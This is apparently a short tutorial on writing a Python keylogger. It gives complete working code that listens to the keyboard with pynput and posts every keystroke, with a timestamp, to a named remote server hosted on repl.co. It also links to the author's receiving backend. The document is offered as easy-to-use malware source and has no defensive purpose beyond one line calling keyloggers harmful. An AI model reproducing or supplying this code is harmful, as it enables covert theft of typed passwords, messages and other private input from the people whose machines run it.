# Keylogger

The keylogger is arguably a very harmful type of malware. When a key is pressed, it gets recorded and saved by the keylogger and
sometimes sent to a remote server where it will get stored. It is very easy to make a keylogger.

We'll only need 3 modules in order to create a keylogger,
pynput for recording the keys,
time for recording the time of the key presses,
and requests for storing the data to a server.

```
import pynput.keyboard
import time
import requests
```

We'll make a function for what happens for what happens when someone presses a key

```
def on_press(key):
  x = requests.post('https://malware-data-receiver.mostuserstaken.repl.co/', data={'data': f'{time.asctime()}: {key}'})
```

I'm using repl.it for the remote server because they allow websites to be made in python and I can send a requests post to store the data with a python backend doing the work.
You can see it for yourself at https://replit.com/@MostUsersTaken/malware-data-receiver#main.py

Now all we need to do is turn on the listener

```
with pynput.keyboard.Listener(on_press=on_press) as listener:
	listener.join()
```

That's it. That's all you need to do to make a keylogger and save it.
